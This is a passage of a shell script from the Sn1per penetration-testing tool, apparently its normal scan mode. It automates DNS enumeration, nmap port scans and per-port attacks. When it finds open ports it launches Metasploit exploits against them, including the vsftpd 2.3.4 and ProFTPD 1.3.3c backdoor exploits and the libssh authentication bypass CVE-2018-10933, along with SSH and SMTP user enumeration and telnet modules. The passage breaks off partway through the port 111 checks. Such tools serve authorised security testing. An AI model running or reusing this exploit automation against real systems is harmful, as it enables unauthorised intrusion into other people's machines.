# NORMAL SCAN #####################################################################################################
if [ "$REPORT" = "1" ]; then
  args="-t $TARGET"
  if [ "$OSINT" = "1" ]; then
    args="$args -o"
  fi
  if [ "$AUTOBRUTE" = "1" ]; then
    args="$args -b"
  fi
  if [ "$FULLNMAPSCAN" = "1" ]; then
    args="$args -fp"
  fi
  if [ "$RECON" = "1" ]; then
    args="$args -re"
  fi
  if [ "$MODE" = "port" ]; then
    args="$args -m port"
  fi
  if [ ! -z "$PORT" ]; then
    args="$args -p $PORT"
  fi
  if [ ! -z "$WORKSPACE" ]; then
    args="$args -w $WORKSPACE"
  fi
  args="$args --noreport"
  echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/$TARGET-normal.txt
  sniper $args | tee $LOOT_DIR/output/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
  exit
fi

echo -e "$OKRED                ____               $RESET"
echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
echo -e "$OKRED               /_/                 $RESET"
echo -e "$RESET"
echo -e "$OKORANGE + -- --=[https://xerosecurity.com"
echo -e "$OKORANGE + -- --=[Sn1per v$VER by @xer0dayz"
echo -e "$RESET"

if [ ! -z $WORKSPACE ]; then
  LOOT_DIR=$WORKSPACE_DIR
fi

echo "$TARGET" >> $LOOT_DIR/domains/targets.txt

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED GATHERING DNS INFO $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
dig all +short $TARGET > $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
dig all +short -x $TARGET >> $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
dig A $TARGET 2> /dev/null >> $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null
dnsenum $TARGET 2> /dev/null
mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED CHECKING FOR SUBDOMAIN HIJACKING $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
cat $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine|cloudapp" | tee $LOOT_DIR/nmap/takeovers-$TARGET.txt 2>/dev/null

source $INSTALL_DIR/modes/osint.sh
source $INSTALL_DIR/modes/recon.sh

echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED PINGING HOST $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
ping -c 1 $TARGET
echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
if [ "$MODE" == "web" ]; then
  nmap -sV -T5 -Pn -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
elif [ ! -z "$PORT" ]; then 
  nmap -sS -T5 -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
else
  nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING UDP PORT SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
if [ -z "$PORT" ]; then
  nmap -Pn -sU -T4 -p$DEFAULT_UDP_PORTS --open $TARGET -oX $LOOT_DIR/nmap/nmap-udp-$TARGET.xml
else
  nmap -Pn -sU -T4 -p$PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-udp-$TARGET.xml
fi

echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED RUNNING INTRUSIVE SCANS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
port_21=`grep 'portid="21"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_22=`grep 'portid="22"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_23=`grep 'portid="23"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_25=`grep 'portid="25"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_53=`grep 'portid="53"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_79=`grep 'portid="79"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_110=`grep 'portid="110"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_111=`grep 'portid="111"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_135=`grep 'portid="135"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_137=`grep 'portid="137"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_139=`grep 'portid="139"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_162=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_389=`grep 'portid="389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="512"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_513=`grep 'portid="513"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_514=`grep 'portid="514"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_623=`grep 'portid="623"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_624=`grep 'portid="624"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_4443=`grep 'portid="4443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5555=`grep 'portid="5555"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5984=`grep 'portid="5984"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_7001=`grep 'portid="7001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8888=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27018=`grep 'portid="27018"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27019=`grep 'portid="27019"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_28017=`grep 'portid="28017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`

if [ "$FULLNMAPSCAN" = "1" ]; then
  port_67=`grep 'portid="67"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_68=`grep 'portid="68"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_69=`grep 'portid="69"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_123=`grep 'portid="123"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
fi

if [ -z "$port_21" ];
then
  echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
else
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port21.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT FTP VERSION SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw > $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT ANONYMOUS FTP SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/anonymous; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw > $LOOT_DIR/output/msf-$TARGET-port21-anonymous.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use exploit/unix/ftp/vsftpd_234_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PROFTPD 1.3.3C BACKDOOR EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use unix/ftp/proftpd_133c_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw 2> /dev/null
  fi
fi

if [ -z "$port_22" ];
then
  echo -e "$OKRED + -- --=[Port 22 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 22 opened... running tests...$RESET"
  if [ $DISTRO == "blackarch" ]; then
    if [ $SSH_AUDIT = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      /bin/ssh-audit $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
    fi
  else
    if [ $SSH_AUDIT = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      cd $PLUGINS_DIR/ssh-audit
      python ssh-audit.py $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
    fi
  fi
  cd $INSTALL_DIR
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port22.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SSH VERSION SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING OPENSSH USER ENUM SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING LIBSSH AUTH BYPASS EXPLOIT CVE-2018-10933 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/libssh_auth_bypass; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw 2> /dev/null
  fi
fi

if [ -z "$port_23" ];
then
  echo -e "$OKRED + -- --=[Port 23 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port23.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port23.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port23.raw > $LOOT_DIR/output/msf-$TARGET-port23.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port23.raw 2> /dev/null
  fi
fi

if [ -z "$port_25" ];
then
  echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port25.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SMTP USER ENUM $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw > $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw 2> /dev/null
  fi
fi

if [ -z "$port_53" ];
then
  echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=dns* -p 53 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port53.txt
  fi
fi

if [ -z "$port_67" ];
then
  echo -e "$OKRED + -- --=[Port 67 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 67 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 67 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port67.txt
  fi
fi

if [ -z "$port_68" ];
then
  echo -e "$OKRED + -- --=[Port 68 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 68 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 68 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port68.txt
  fi
fi

if [ -z "$port_69" ];
then
  echo -e "$OKRED + -- --=[Port 69 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 69 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sU -sV -Pn -T5 --script=tftp* -p 69 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port69.txt
  fi
fi

if [ -z "$port_79" ];
then
  echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port79.txt
  fi
fi

if [ -z "$port_80" ];
then
  echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
  if [ "$WAFWOOF" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR WAF $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wafw00f http://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-http.raw 2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-http.raw > $LOOT_DIR/web/waf-$TARGET-http.txt 2> /dev/null
    rm -f $LOOT_DIR/web/waf-$TARGET-http.raw 2> /dev/null
    echo ""
  fi
  if [ "$WHATWEB" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING HTTP INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    whatweb -a 3 http://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-http.raw  2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-http.raw > $LOOT_DIR/web/whatweb-$TARGET-http.txt 2> /dev/null
    rm -f $LOOT_DIR/web/whatweb-$TARGET-http.raw 2> /dev/null
  fi
  if [ "$WIG" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING SERVER INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/wig/wig.py -d -q http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
  curl --connect-timeout 5 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
  curl --connect-timeout 5 -I -s -R -L http://$TARGET | tee $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null
  if [ "$WEBTECH" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    webtech -u http://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-http.txt
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | grep generator | cut -d\" -f4 2> /dev/null | tee $LOOT_DIR/web/webgenerator-http-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING COMMENTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | grep "<\!\-\-" 2> /dev/null | tee $LOOT_DIR/web/webcomments-http-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING SITE LINKS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | egrep "\"" | cut -d\" -f2 | grep  \/ | sort -u 2> /dev/null | tee $LOOT_DIR/web/weblinks-http-$TARGET.txt 2> /dev/null
  if [ $CUTYCAPT = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
    if [ ${DISTRO} == "blackarch"  ]; then
      /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=5000 2> /dev/null
    else
      cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=5000 2> /dev/null
    fi
  fi
  source $INSTALL_DIR/modes/normal_webporthttp.sh
  source $INSTALL_DIR/modes/osint_stage_2.sh
fi

if [ -z "$port_110" ];
then
  echo -e "$OKRED + -- --=[Port 110 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 110 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV  -T5 --script=pop* -p 110 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port110.txt
  fi
fi

if [ -z "$port_111" ];
then
  echo -e "$OKRED + -- --=[Port 111 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 111 opened... running tests...$RESET"
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw > $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw 2> /dev/null
  fi
  if [ "$SHOW_MOUNT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHOW MOUNT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    showmount -a $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111a.txt
